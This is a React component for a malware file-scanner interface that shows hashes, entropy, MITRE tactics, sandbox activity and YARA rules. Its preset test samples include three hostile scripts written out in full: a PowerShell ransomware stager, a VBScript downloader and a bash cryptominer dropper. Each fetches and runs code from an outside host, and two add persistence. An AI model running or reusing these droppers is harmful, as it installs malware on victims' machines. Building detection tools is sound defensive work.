"use client";

import React, { useState, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  UploadCloud,
  FileCode,
  AlertOctagon,
  ShieldCheck,
  Cpu,
  Copy,
  Check,
  Download,
  Terminal,
  Activity,
  Layers,
  Sparkles,
  Zap,
  Lock,
  ArrowRight,
  RefreshCw,
  Eye,
  AlertTriangle,
} from "lucide-react";
import confetti from "canvas-confetti";
import { FileScanResult } from "@/types";
import { playScanStartSound, playThreatAlertSound, playHoverBlip } from "@/lib/sound";
import { AsciiGlitchRipple } from "./ui/AsciiGlitchRipple";
import { FlipText } from "./ui/FlipText";
import { CircularProgressIndicator, ScanningStatusBadge } from "./ui/CircularProgressIndicator";

const SAMPLE_PAYLOADS = [
  {
    name: "ransomware_wannacry_stager.ps1",
    type: "powershell",
    desc: "Simulated WannaCry dropper with shadowcopy deletion & C2 beaconing",
    content: `# WannaCry Simulated Staging Script
$c2_server = "http://185.220.101.42:8080/stage2.bin"
$dest = "$env:TEMP\\wcry_payload.exe"
Write-Host "[!] Initializing encryption payload..."
(New-Object Net.WebClient).DownloadFile($c2_server, $dest)
# Defense evasion: Disable shadow copies and recovery
cmd.exe /c "vssadmin.exe Delete Shadows /All /Quiet"
cmd.exe /c "wbadmin DELETE SYSTEMSTATEBACKUP"
# Persistence via registry run key
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WcryUpdate" -Value $dest
Start-Process $dest -WindowStyle Hidden`,
  },
  {
    name: "agent_tesla_stealer.vbs",
    type: "vbs",
    desc: "VBScript credential harvester & keylogger stager",
    content: `' AgentTesla Keylogger Staging Payload
Dim objShell, httpReq, strPayload
Set objShell = CreateObject("WScript.Shell")
Set httpReq = CreateObject("MSXML2.XMLHTTP")
httpReq.Open "GET", "http://malicious-c2-beacon.ru/agent_tesla.bin", False
httpReq.Send
If httpReq.Status = 200 Then
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write httpReq.responseBody
    stream.SaveToFile objShell.ExpandEnvironmentStrings("%APPDATA%") & "\\agent.exe", 2
    objShell.Run "rundll32.exe " & objShell.ExpandEnvironmentStrings("%APPDATA%") & "\\agent.exe,DllRegisterServer", 0
End If`,
  },
  {
    name: "clean_system_diagnostic.py",
    type: "python",
    desc: "Legitimate hardware & network benchmark diagnostic script",
    content: `"""
System Health & Memory Diagnostic Tool (Clean)
"""
import os
import platform
import socket

def collect_diagnostics():
    info = {
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "processor": platform.processor(),
        "cpu_count": os.cpu_count()
    }
    print("[+] System Health Normal. No anomalous memory hooks found.")
    return info

if __name__ == "__main__":
    collect_diagnostics()`,
  },
  {
    name: "cryptominer_xmrig_loader.sh",
    type: "bash",
    desc: "Linux stealth Monero cryptominer dropper with cron persistence",
    content: `#!/bin/bash
# XMRig Miner Dropper
C2_POOL="stratum+tcp://xmr.pool.minergate.com:45700"
WALLET="48edfHu7V9Z84YzzMa6yUWB45PF3DwT7Y2P"
curl -s -L http://91.240.118.14/xmrig_linux64 -o /tmp/.kworker_daemon
chmod +x /tmp/.kworker_daemon
# Persistence in crontab
(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/.kworker_daemon -o $C2_POOL -u $WALLET --donate-level=1 -B") | crontab -
/tmp/.kworker_daemon -o $C2_POOL -u $WALLET -B &`,
  },
];

export function FileScanner() {
  const [activeTab, setActiveTab] = useState<"upload" | "paste">("upload");
  const [fileName, setFileName] = useState("");
  const [fileContentBase64, setFileContentBase64] = useState<string | null>(null);
  const [textContent, setTextContent] = useState("");
  const [fileSize, setFileSize] = useState<number | null>(null);
  const [isScanning, setIsScanning] = useState(false);
  const [scanStep, setScanStep] = useState(0);
  const [scanResult, setScanResult] = useState<FileScanResult | null>(null);
  const [copiedHash, setCopiedHash] = useState<string | null>(null);
  const [copiedYara, setCopiedYara] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  const fileInputRef = useRef<HTMLInputElement>(null);

  const scanSteps = [
    "Reading file buffer & magic bytes...",
    "Computing SHA-256, SHA-1, MD5 hashes...",
    "Calculating Shannon Entropy distribution...",
    "Extracting static strings & suspicious API calls...",
    "Correlating MITRE ATT&CK Matrix via Gemini 3.7...",
    "Synthesizing YARA detection rules...",
  ];

  const handleFileUpload = (file: File) => {
    setErrorMsg(null);
    setFileName(file.name);
    setFileSize(file.size);

    const reader = new FileReader();
    reader.onload = () => {
      const resultStr = reader.result as string;
      // Extract base64 without prefix
      const base64Data = resultStr.split(",")[1] || resultStr;
      setFileContentBase64(base64Data);
    };
    reader.readAsDataURL(file);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleFileUpload(e.dataTransfer.files[0]);
    }
  };

  const handlePresetSelect = (preset: typeof SAMPLE_PAYLOADS[0]) => {
    playHoverBlip();
    setFileName(preset.name);
    setTextContent(preset.content);
    setFileContentBase64(null);
    setFileSize(preset.content.length);
    setActiveTab("paste");
  };

  const handleStartScan = async () => {
    if (!fileName && !textContent && !fileContentBase64) {
      setErrorMsg("Please upload a file or select a sample payload to scan.");
      return;
    }

    setErrorMsg(null);
    setIsScanning(true);
    setScanResult(null);
    playScanStartSound();

    // Step cycle animation
    let step = 0;
    const interval = setInterval(() => {
      step = (step + 1) % scanSteps.length;
      setScanStep(step);
    }, 450);

    try {
      const payload = {
        fileName: fileName || "custom_script.txt",
        fileContentBase64: fileContentBase64,
        textContent: activeTab === "paste" ? textContent : undefined,
        fileType: fileName ? fileName.split(".").pop() : "txt",
      };

      const res = await fetch("/api/scan/file", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();
      clearInterval(interval);

      if (!res.ok || !data.success) {
        throw new Error(data.error || "Failed to scan file");
      }

      setScanResult(data.result);
      const isMalicious = data.result.threatLevel === "MALICIOUS" || data.result.threatLevel === "CRITICAL";
      playThreatAlertSound(isMalicious);

      if (!isMalicious && data.result.threatScore < 20) {
        confetti({
          particleCount: 80,
          spread: 70,
          origin: { y: 0.6 },
          colors: ["#10b981", "#38bdf8", "#6ee7b7"],
        });
      }
    } catch (err: any) {
      clearInterval(interval);
      setErrorMsg(err.message || "Threat scanning encountered an error.");
    } finally {
      setIsScanning(false);
    }
  };

  const handleCopyHash = (text: string, type: string) => {
    navigator.clipboard.writeText(text);
    setCopiedHash(type);
    setTimeout(() => setCopiedHash(null), 2000);
  };

  const handleCopyYara = () => {
    if (!scanResult?.yaraRule) return;
    navigator.clipboard.writeText(scanResult.yaraRule);
    setCopiedYara(true);
    setTimeout(() => setCopiedYara(false), 2000);
  };

  const handleDownloadYara = () => {
    if (!scanResult?.yaraRule) return;
    const blob = new Blob([scanResult.yaraRule], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `Aegis_${scanResult.fileName.replace(/[^a-zA-Z0-9]/g, "_")}.yar`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const getThreatColor = (level: string) => {
    switch (level) {
      case "CRITICAL":
      case "MALICIOUS":
        return {
          badge: "bg-red-950/80 text-red-400 border-red-500/40",
          gauge: "from-red-500 to-rose-600",
          text: "text-red-400",
          border: "border-red-500/30",
        };
      case "SUSPICIOUS":
        return {
          badge: "bg-amber-950/80 text-amber-400 border-amber-500/40",
          gauge: "from-amber-500 to-yellow-600",
          text: "text-amber-400",
          border: "border-amber-500/30",
        };
      default:
        return {
          badge: "bg-emerald-950/80 text-emerald-400 border-emerald-500/40",
          gauge: "from-emerald-500 to-teal-500",
          text: "text-emerald-400",
          border: "border-emerald-500/30",
        };
    }
  };

  return (
    <div className="w-full max-w-7xl mx-auto px-4 py-8">
      {/* Container Card */}
      <div className="relative rounded-2xl bg-[#111111] border border-white/10 shadow-2xl p-6 md:p-8 overflow-hidden group">
        {/* Sleek top gradient highlight bar */}
        <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-blue-500 to-transparent pointer-events-none" />

        {/* Section Header */}
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-white/10">
          <div className="flex items-center gap-3">
            <div className="p-3 rounded-xl bg-white/5 border border-white/10 text-blue-400 shadow-[0_0_15px_rgba(59,130,246,0.15)]">
              <FileCode className="w-6 h-6 text-blue-400" />
            </div>
            <div>
              <h2 className="text-xl md:text-2xl font-black tracking-tight text-white flex items-center gap-2">
                <FlipText duration={2.5}>FILE THREAT SCANNER</FlipText>
              </h2>
              <p className="text-xs md:text-sm text-white/40 font-mono">
                Static Heuristics • Shannon Entropy • Gemini 3.7 MITRE Correlator
              </p>
            </div>
          </div>

          {/* Mode Switch Tabs */}
          <div className="flex items-center gap-1 p-1 rounded-xl bg-black/60 border border-white/10">
            <button
              onClick={() => {
                playHoverBlip();
                setActiveTab("upload");
              }}
              className={`px-4 py-2 rounded-lg text-xs font-semibold font-mono tracking-wider transition-all cursor-pointer ${
                activeTab === "upload"
                  ? "bg-blue-500/15 text-blue-400 border border-blue-500/30 shadow-sm"
                  : "text-white/40 hover:text-white"
              }`}
            >
              FILE DROPZONE
            </button>
            <button
              onClick={() => {
                playHoverBlip();
                setActiveTab("paste");
              }}
              className={`px-4 py-2 rounded-lg text-xs font-semibold font-mono tracking-wider transition-all cursor-pointer ${
                activeTab === "paste"
                  ? "bg-blue-500/15 text-blue-400 border border-blue-500/30 shadow-sm"
                  : "text-white/40 hover:text-white"
              }`}
            >
              CODE / SCRIPT SNIPPET
            </button>
          </div>
        </div>

        {/* Preset Sample Badges */}
        <div className="mt-5">
          <div className="text-[10px] font-bold text-white/40 uppercase tracking-widest flex items-center gap-2 mb-2.5">
            <Zap className="w-3.5 h-3.5 text-blue-400" />
            <span>Load Quick Threat Test Presets:</span>
          </div>
          <div className="flex flex-wrap gap-2">
            {SAMPLE_PAYLOADS.map((sample) => (
              <button
                key={sample.name}
                onClick={() => handlePresetSelect(sample)}
                className="group flex items-center gap-2 px-3 py-1.5 rounded-lg bg-white/5 hover:bg-blue-500/10 border border-white/10 hover:border-blue-500/40 text-xs font-mono text-white/70 hover:text-blue-300 transition-all text-left cursor-pointer"
                title={sample.desc}
              >
                <Terminal className="w-3 h-3 text-blue-400 group-hover:rotate-12 transition-transform" />
                <span className="font-semibold">{sample.name}</span>
                <span className="text-[10px] px-1.5 py-0.5 rounded bg-black/50 text-white/50 group-hover:bg-blue-900/60 group-hover:text-blue-200">
                  {sample.type}
                </span>
              </button>
            ))}
          </div>
        </div>

        {/* Input Area */}
        <div className="mt-6">
          {activeTab === "upload" ? (
            <div
              onDragOver={(e) => e.preventDefault()}
              onDrop={handleDrop}
              onClick={() => fileInputRef.current?.click()}
              className="group relative border-2 border-dashed border-white/10 hover:border-blue-500/50 rounded-xl p-8 md:p-12 flex flex-col items-center justify-center text-center cursor-pointer transition-all bg-black/40 hover:bg-black/60"
            >
              <input
                ref={fileInputRef}
                type="file"
                className="hidden"
                onChange={(e) => e.target.files?.[0] && handleFileUpload(e.target.files[0])}
              />
              <div className="p-4 rounded-2xl bg-white/5 border border-white/10 text-white/40 mb-4 group-hover:text-blue-400 group-hover:border-blue-500/30 group-hover:scale-110 transition-all">
                <UploadCloud className="w-8 h-8" />
              </div>
              <div className="text-sm md:text-base font-bold text-white mb-1">
                {fileName ? (
                  <span className="text-blue-400 font-mono">{fileName}</span>
                ) : (
                  <span>Drag and drop suspicious file here, or click to browse</span>
                )}
              </div>
              <p className="text-xs text-white/40 font-mono">
                Supports .exe, .dll, .ps1, .vbs, .docm, .pdf, .py, .sh, .bin, .apk (Max 50MB)
              </p>
              {fileSize && (
                <div className="mt-3 inline-flex items-center gap-2 px-3 py-1 rounded-md bg-white/5 border border-white/10 text-xs font-mono text-blue-300">
                  <span>Size: {(fileSize / 1024).toFixed(1)} KB</span>
                </div>
              )}
            </div>
          ) : (
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <label className="text-[10px] font-bold text-white/40 uppercase tracking-wider">
                  Target File Name / Signature Tag:
                </label>
                <input
                  type="text"
                  value={fileName}
                  onChange={(e) => setFileName(e.target.value)}
                  placeholder="e.g. suspicious_dropper.ps1"
                  className="px-3 py-1.5 rounded-lg bg-black border border-white/10 text-xs font-mono text-blue-300 focus:outline-none focus:border-blue-500 w-64"
                />
              </div>
              <textarea
                value={textContent}
                onChange={(e) => setTextContent(e.target.value)}
                placeholder="Paste suspicious PowerShell, VBScript, Python, Bash, or Base64 payload here..."
                rows={7}
                className="w-full rounded-xl bg-black border border-white/10 p-4 text-xs font-mono text-white/90 placeholder:text-white/20 focus:outline-none focus:border-blue-500/60 leading-relaxed resize-y"
              />
            </div>
          )}
        </div>

        {errorMsg && (
          <div className="mt-4 p-3 rounded-xl bg-red-950/80 border border-red-500/40 text-red-300 text-xs font-mono flex items-center gap-2">
            <AlertOctagon className="w-4 h-4 shrink-0 text-red-400" />
            <span>{errorMsg}</span>
          </div>
        )}

        {/* Scan Trigger Button */}
        <div className="mt-6 flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="text-xs text-white/40 font-mono flex items-center gap-2">
            <ShieldCheck className="w-4 h-4 text-green-400" />
            <span>Air-gapped safe environment: payload isolated in container</span>
          </div>

          <button
            onClick={handleStartScan}
            disabled={isScanning}
            className={`w-full sm:w-auto px-8 py-3.5 rounded-xl font-mono text-sm font-bold tracking-wider uppercase transition-all flex items-center justify-center gap-2.5 cursor-pointer ${
              isScanning
                ? "bg-cyan-950/80 text-cyan-300 border border-cyan-500/50 shadow-[0_0_25px_rgba(6,182,212,0.35)] cursor-not-allowed"
                : "bg-blue-500 hover:bg-blue-600 text-white shadow-[-4px_4px_0px_0px_#000000] hover:translate-x-0.5 hover:-translate-y-0.5"
            }`}
          >
            {isScanning ? (
              <>
                <CircularProgressIndicator size={18} strokeWidth={2.5} isIndeterminate={true} colorClassName="text-cyan-400" />
                <ScanningStatusBadge label="Scanning..." showPercent={false} />
              </>
            ) : (
              <>
                <Cpu className="w-4 h-4 text-white" />
                <span>LAUNCH THREAT SCAN</span>
              </>
            )}
          </button>
        </div>

        {/* Scanning Animated Progress Status */}
        <AnimatePresence>
          {isScanning && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: "auto" }}
              exit={{ opacity: 0, height: 0 }}
              className="mt-6 p-4 rounded-xl bg-blue-500/10 border border-blue-500/20 overflow-hidden"
            >
              <div className="flex items-center justify-between mb-2 font-mono text-xs text-blue-300">
                <span className="flex items-center gap-2">
                  <Activity className="w-4 h-4 animate-pulse text-blue-400" />
                  {scanSteps[scanStep]}
                </span>
                <span className="text-blue-400 font-bold">
                  {Math.round(((scanStep + 1) / scanSteps.length) * 100)}%
                </span>
              </div>
              <div className="w-full h-1.5 rounded-full bg-black overflow-hidden">
                <motion.div
                  className="h-full bg-gradient-to-r from-blue-600 via-blue-400 to-green-400"
                  initial={{ width: "10%" }}
                  animate={{ width: `${((scanStep + 1) / scanSteps.length) * 100}%` }}
                  transition={{ duration: 0.3 }}
                />
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Scan Results View */}
        <AnimatePresence>
          {scanResult && (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5 }}
              className="mt-8 pt-8 border-t border-white/10 space-y-6"
            >
              {/* Top Banner Card */}
              {(() => {
                const colors = getThreatColor(scanResult.threatLevel);
                return (
                  <div
                    className={`p-6 rounded-xl bg-black/60 border ${colors.border} flex flex-col lg:flex-row items-start lg:items-center justify-between gap-6 shadow-xl`}
                  >
                    <div className="space-y-2">
                      <div className="flex flex-wrap items-center gap-2">
                        <span
                          className={`px-3 py-1 rounded-md text-xs font-black font-mono tracking-widest border ${colors.badge}`}
                        >
                          {scanResult.threatLevel}
                        </span>
                        <span className="text-xs font-mono text-white/40">
                          Scan ID: <strong className="text-white">{scanResult.scanId}</strong>
                        </span>
                        <span className="text-xs font-mono text-white/40">
                          Duration: <strong className="text-blue-400">{scanResult.scanDurationMs}ms</strong>
                        </span>
                        {scanResult.isAiEnhanced && (
                          <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded bg-purple-500/15 text-purple-300 border border-purple-500/30 text-[11px] font-mono">
                            <Sparkles className="w-3 h-3 text-purple-400" />
                            Gemini 3.7 AI
                          </span>
                        )}
                      </div>

                      <h3 className="text-xl md:text-2xl font-black text-white tracking-tight">
                        {scanResult.verdict}
                      </h3>
                      <p className="text-xs md:text-sm text-white/60 max-w-2xl leading-relaxed">
                        {scanResult.summary}
                      </p>
                      <div className="text-xs font-mono text-blue-400">
                        Classified Malware Family: <strong>{scanResult.malwareFamily}</strong>
                      </div>
                    </div>

                    {/* Threat Score Gauge */}
                    <div className="flex flex-col items-center justify-center p-4 rounded-xl bg-black border border-white/10 min-w-[160px]">
                      <div className="text-[10px] font-mono text-white/40 uppercase tracking-wider mb-1">
                        Threat Score
                      </div>
                      <div className={`text-4xl md:text-5xl font-black ${colors.text} font-mono`}>
                        {scanResult.threatScore}
                        <span className="text-base text-white/30 font-normal">/100</span>
                      </div>
                      <div className="w-full bg-white/10 h-1.5 rounded-full mt-2 overflow-hidden">
                        <div
                          className={`h-full bg-gradient-to-r ${colors.gauge}`}
                          style={{ width: `${scanResult.threatScore}%` }}
                        />
                      </div>
                    </div>
                  </div>
                );
              })()}

              {/* Hashes & Entropy Grid */}
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                {/* SHA256 */}
                <div className="p-4 rounded-xl bg-white/5 border border-white/10">
                  <div className="flex items-center justify-between mb-1.5">
                    <span className="text-[11px] font-mono font-bold text-white/40">SHA-256 HASH</span>
                    <button
                      onClick={() => handleCopyHash(scanResult.sha256, "sha256")}
                      className="text-white/40 hover:text-blue-400 transition-colors cursor-pointer"
                      title="Copy SHA-256"
                    >
                      {copiedHash === "sha256" ? (
                        <Check className="w-3.5 h-3.5 text-green-400" />
                      ) : (
                        <Copy className="w-3.5 h-3.5" />
                      )}
                    </button>
                  </div>
                  <div className="font-mono text-[11px] text-blue-300 break-all leading-tight">
                    {scanResult.sha256}
                  </div>
                </div>

                {/* MD5 */}
                <div className="p-4 rounded-xl bg-white/5 border border-white/10">
                  <div className="flex items-center justify-between mb-1.5">
                    <span className="text-[11px] font-mono font-bold text-white/40">MD5 HASH</span>
                    <button
                      onClick={() => handleCopyHash(scanResult.md5, "md5")}
                      className="text-white/40 hover:text-blue-400 transition-colors cursor-pointer"
                      title="Copy MD5"
                    >
                      {copiedHash === "md5" ? (
                        <Check className="w-3.5 h-3.5 text-green-400" />
                      ) : (
                        <Copy className="w-3.5 h-3.5" />
                      )}
                    </button>
                  </div>
                  <div className="font-mono text-[11px] text-blue-300 break-all leading-tight">
                    {scanResult.md5}
                  </div>
                </div>

                {/* Shannon Entropy */}
                <div className="p-4 rounded-xl bg-white/5 border border-white/10">
                  <div className="text-[11px] font-mono font-bold text-white/40 mb-1">
                    SHANNON ENTROPY
                  </div>
                  <div className="flex items-baseline gap-2">
                    <span className="text-xl font-bold font-mono text-blue-400">
                      {scanResult.entropy}
                    </span>
                    <span className="text-xs text-white/40 font-mono">/ 8.00</span>
                  </div>
                  <div className="text-[10px] text-white/40 mt-1">
                    {scanResult.entropy > 7.0
                      ? "High (Packed/Encrypted)"
                      : scanResult.entropy > 5.0
                      ? "Normal Code Density"
                      : "Low Byte Density"}
                  </div>
                </div>

                {/* File Details */}
                <div className="p-4 rounded-xl bg-white/5 border border-white/10">
                  <div className="text-[11px] font-mono font-bold text-white/40 mb-1">
                    FILE METRICS
                  </div>
                  <div className="text-xs font-mono text-white/80">
                    <div>Type: <span className="text-blue-400">{scanResult.fileType}</span></div>
                    <div>Size: <span className="text-white/60">{scanResult.fileSize} bytes</span></div>
                  </div>
                </div>
              </div>

              {/* MITRE ATT&CK Matrix */}
              {scanResult.mitreTactics && scanResult.mitreTactics.length > 0 && (
                <div className="p-6 rounded-xl bg-white/5 border border-white/10">
                  <div className="flex items-center gap-2 mb-4">
                    <Layers className="w-5 h-5 text-blue-400" />
                    <h4 className="text-base font-bold text-white font-mono uppercase tracking-wide">
                      MITRE ATT&CK® Enterprise Tactics & Techniques
                    </h4>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
                    {scanResult.mitreTactics.map((tactic, idx) => (
                      <div
                        key={idx}
                        className="p-3 rounded-xl bg-black border border-white/10 text-left hover:border-blue-500/40 transition-colors"
                      >
                        <div className="flex items-center justify-between mb-1">
                          <span className="px-2 py-0.5 rounded bg-blue-500/15 text-blue-300 font-mono text-[10px] font-bold border border-blue-500/30">
                            {tactic.id}
                          </span>
                          <span className="text-[10px] font-mono text-white/40">
                            {tactic.tactic}
                          </span>
                        </div>
                        <div className="text-xs font-bold text-white mb-1 font-mono">
                          {tactic.technique}
                        </div>
                        <p className="text-[11px] text-white/50 leading-snug">
                          {tactic.description}
                        </p>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Sandbox Activity & Emulation */}
              {scanResult.sandboxActivity && (
                <div className="p-6 rounded-xl bg-white/5 border border-white/10">
                  <div className="flex items-center gap-2 mb-4">
                    <Terminal className="w-5 h-5 text-purple-400" />
                    <h4 className="text-base font-bold text-white font-mono uppercase tracking-wide">
                      Sandbox Behavioral Activity & Telemetry
                    </h4>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {/* Process executions */}
                    <div className="p-3.5 rounded-xl bg-black border border-white/10">
                      <div className="text-xs font-mono font-bold text-blue-400 mb-2 flex items-center gap-1.5">
                        <Cpu className="w-3.5 h-3.5" />
                        <span>Spawned Processes:</span>
                      </div>
                      {scanResult.sandboxActivity.processCalls.length > 0 ? (
                        <ul className="space-y-1 font-mono text-xs text-white/80">
                          {scanResult.sandboxActivity.processCalls.map((proc, i) => (
                            <li key={i} className="flex items-start gap-2">
                              <span className="text-blue-500">•</span>
                              <span className="break-all">{proc}</span>
                            </li>
                          ))}
                        </ul>
                      ) : (
                        <div className="text-xs text-white/30 font-mono">No suspicious process spawns</div>
                      )}
                    </div>

                    {/* Network C2 connections */}
                    <div className="p-3.5 rounded-xl bg-black border border-white/10">
                      <div className="text-xs font-mono font-bold text-red-400 mb-2 flex items-center gap-1.5">
                        <AlertTriangle className="w-3.5 h-3.5" />
                        <span>C2 Network Sockets:</span>
                      </div>
                      {scanResult.sandboxActivity.networkConnections.length > 0 ? (
                        <ul className="space-y-1 font-mono text-xs text-white/80">
                          {scanResult.sandboxActivity.networkConnections.map((net, i) => (
                            <li key={i} className="flex items-start gap-2">
                              <span className="text-red-500">•</span>
                              <span className="break-all">{net}</span>
                            </li>
                          ))}
                        </ul>
                      ) : (
                        <div className="text-xs text-white/30 font-mono">No unauthorized outbound connections</div>
                      )}
                    </div>

                    {/* Registry Keys */}
                    <div className="p-3.5 rounded-xl bg-black border border-white/10">
                      <div className="text-xs font-mono font-bold text-amber-400 mb-2 flex items-center gap-1.5">
                        <Lock className="w-3.5 h-3.5" />
                        <span>Registry Alterations & Persistence:</span>
                      </div>
                      {scanResult.sandboxActivity.registryKeys.length > 0 ? (
                        <ul className="space-y-1 font-mono text-xs text-white/80">
                          {scanResult.sandboxActivity.registryKeys.map((reg, i) => (
                            <li key={i} className="flex items-start gap-2">
                              <span className="text-amber-500">•</span>
                              <span className="break-all">{reg}</span>
                            </li>
                          ))}
                        </ul>
                      ) : (
                        <div className="text-xs text-white/30 font-mono">No persistent registry keys written</div>
                      )}
                    </div>

                    {/* File Ops */}
                    <div className="p-3.5 rounded-xl bg-black border border-white/10">
                      <div className="text-xs font-mono font-bold text-green-400 mb-2 flex items-center gap-1.5">
                        <FileCode className="w-3.5 h-3.5" />
                        <span>File System Operations:</span>
                      </div>
                      {scanResult.sandboxActivity.fileSystemOps.length > 0 ? (
                        <ul className="space-y-1 font-mono text-xs text-white/80">
                          {scanResult.sandboxActivity.fileSystemOps.map((f, i) => (
                            <li key={i} className="flex items-start gap-2">
                              <span className="text-green-500">•</span>
                              <span className="break-all">{f}</span>
                            </li>
                          ))}
                        </ul>
                      ) : (
                        <div className="text-xs text-white/30 font-mono">No malicious file droppers identified</div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* YARA Detection Rule */}
              {scanResult.yaraRule && (
                <div className="p-6 rounded-xl bg-white/5 border border-white/10">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-3">
                    <div className="flex items-center gap-2">
                      <Terminal className="w-5 h-5 text-blue-400" />
                      <h4 className="text-base font-bold text-white font-mono uppercase tracking-wide">
                        Synthesized YARA Detection Signature
                      </h4>
                    </div>
                    <div className="flex items-center gap-2">
                      <button
                        onClick={handleCopyYara}
                        className="px-3 py-1.5 rounded-lg bg-white/10 hover:bg-white/15 text-xs font-mono text-white transition-colors flex items-center gap-1.5 cursor-pointer"
                      >
                        {copiedYara ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                        <span>{copiedYara ? "COPIED" : "COPY RULE"}</span>
                      </button>
                      <button
                        onClick={handleDownloadYara}
                        className="px-3 py-1.5 rounded-lg bg-blue-500/20 hover:bg-blue-500/30 text-xs font-mono text-blue-300 border border-blue-500/40 transition-colors flex items-center gap-1.5 cursor-pointer"
                      >
                        <Download className="w-3.5 h-3.5" />
                        <span>DOWNLOAD .YAR</span>
                      </button>
                    </div>
                  </div>
                  <pre className="p-4 rounded-xl bg-black border border-white/10 text-xs font-mono text-blue-200 overflow-x-auto leading-relaxed">
                    {scanResult.yaraRule}
                  </pre>
                </div>
              )}

              {/* Remediation & Containment */}
              {scanResult.remediation && scanResult.remediation.length > 0 && (
                <div className="p-6 rounded-xl bg-white/5 border border-white/10">
                  <div className="flex items-center gap-2 mb-3">
                    <ShieldCheck className="w-5 h-5 text-green-400" />
                    <h4 className="text-base font-bold text-white font-mono uppercase tracking-wide">
                      Tactical Incident Response & Remediation
                    </h4>
                  </div>
                  <div className="space-y-2">
                    {scanResult.remediation.map((step, idx) => (
                      <div
                        key={idx}
                        className="flex items-start gap-3 p-3 rounded-xl bg-black border border-white/10 text-xs font-mono text-white/80"
                      >
                        <span className="flex h-5 w-5 rounded-full bg-blue-500/20 text-blue-400 font-bold items-center justify-center shrink-0 border border-blue-500/30 text-[10px]">
                          {idx + 1}
                        </span>
                        <span className="mt-0.5">{step}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}

export default FileScanner;
